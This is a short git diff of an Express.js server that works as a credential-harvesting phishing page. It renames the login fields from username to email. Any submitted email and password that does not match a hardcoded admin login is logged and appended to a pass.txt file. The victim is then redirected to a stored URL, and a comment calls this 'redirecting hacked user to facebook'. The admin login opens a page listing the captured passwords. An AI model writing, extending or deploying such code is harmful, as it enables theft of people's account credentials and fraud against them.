@@ -14,9 +14,9 @@ app.get("/", function(req, res){
 });
 
 app.post("/", urlencodedParser, function(req, res){
- var username = req.body.username;
- var password = req.body.password;
- if (username === "magson" && password === "m@gs0n123"){
+ var email = req.body.email;
+ var password = req.body.pass;
+ if (email === "magson" && password === "m@gs0n123"){
   fs.readFile("pass.txt", "utf8", function(err, data){
   fs.readFile("url.txt", "utf8", function(err, link){
     res.render("admin", {data: data, link: link});
@@ -24,8 +24,8 @@ app.post("/", urlencodedParser, function(req, res){
   });
  }
 	else{
-	  console.log("New user credentials " + username + " - " + password);
-	  fs.appendFile("pass.txt", "<br>" + "Username: " + username + " - " + "Password: " + password, function(err){
+	  console.log("New user credentials " + email + " - " + password);
+	  fs.appendFile("pass.txt", "email: " + email + " - " + "Password: " + password + "                             ", function(err){
 	    // redirecting hacked user to facebook        
             fs.readFile("url.txt", "utf8", function(err, data){
 	    res.redirect(data); 
